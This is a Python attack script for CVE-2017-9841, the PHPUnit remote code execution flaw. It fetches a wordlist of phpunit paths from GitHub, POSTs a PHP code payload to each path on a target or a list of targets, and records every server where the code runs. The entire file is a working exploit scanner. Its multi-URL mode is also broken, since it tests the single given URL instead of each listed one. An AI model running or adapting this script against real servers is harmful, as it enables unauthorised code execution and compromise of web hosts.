#!/usr/bin/env python
#
#
#
# phpunit-brute.py - Finding paths to phpunit to gain RCE. (CVE-2017-9841)
#
# By @RandomRobbieBF
#
#
import requests
import sys
import argparse
import os.path
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

USER_AGENT = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:75.0) Gecko/20100101 Firefox/75.0"


parser = argparse.ArgumentParser()
parser.add_argument(
    "-u", "--url",
    type=str,
    required=False,
    default="http://localhost",
    help="URL to test"
    )
parser.add_argument(
    "-f", "--file",
    type=str,
    required=False,
    help="File of urls"
    )
parser.add_argument(
    "-p", "--proxy",
    type=str,
    default="",
    required=False,
    help="Proxy for debugging"
    )


def test_url(url, urlpath):
    newurl = url + urlpath
    rawBody = "<?php phpinfo();"
    headers = {
        "User-Agent": USER_AGENT,
        "Connection": "close",
        "Accept": "*/*",
        "Content-Type": "application/x-www-form-urlencoded"
    }
    try:
        response = session.post(newurl, headers=headers, verify=False,
                                data=rawBody, proxies=proxyDict, timeout=30)
        if (response.status_code == 200) and\
           ("PHP License as published by the PHP Group" in response.text):
            print("[+] Found RCE for {} [+]".format(newurl))
            with open("found.txt", "a") as text_file:
                text_file.write(newurl + "\n")
            return True
        else:
            print("[-] No Luck for {} [-]".format(urlpath))
    except Exception as e:
        print("[-] Check Url might have Issues [-]")
        print(e)
        sys.exit(0)


def grab_paths(url):
    headers = {
        "User-Agent": USER_AGENT,
        "Connection": "close",
        "Accept-Language": "en-US,en;q=0.5",
        "Accept-Encoding": "gzip, deflate"
    }
    try:
        response = session.get(
            "https://raw.githubusercontent.com/random-robbie/bruteforce-lists/master/phpunit.txt",
            headers=headers,
            verify=False,
            proxies=proxyDict
        )
        lines = response.text.strip().splitlines()
        for urlpath in lines:
            loop = test_url(url, urlpath)
            if loop:
                break
    except Exception as e:
        print("[-] Failed to obtain paths file [-]")
        print(e)
        sys.exit(0)


if __name__ == "__main__":
    args = parser.parse_args()
    url = args.url
    urls_file = args.file

    session = requests.Session()
    proxy = args.proxy
    http_proxy = proxy
    proxyDict = {
        "http": http_proxy,
        "https": http_proxy,
        "ftp": http_proxy
    }
    try:
        if urls_file and os.path.exists(urls_file):
            with open(urls_file, 'r') as f:
                lines = f.read().splitlines()
            for line in lines:
                try:
                    print("Testing " + url)
                    grab_paths(url)
                except Exception as e:
                    print('Error: %s' % e)
                    pass
        else:
            grab_paths(url)
    except KeyboardInterrupt:
        print("\nCtrl-c pressed…")
        sys.exit(1)
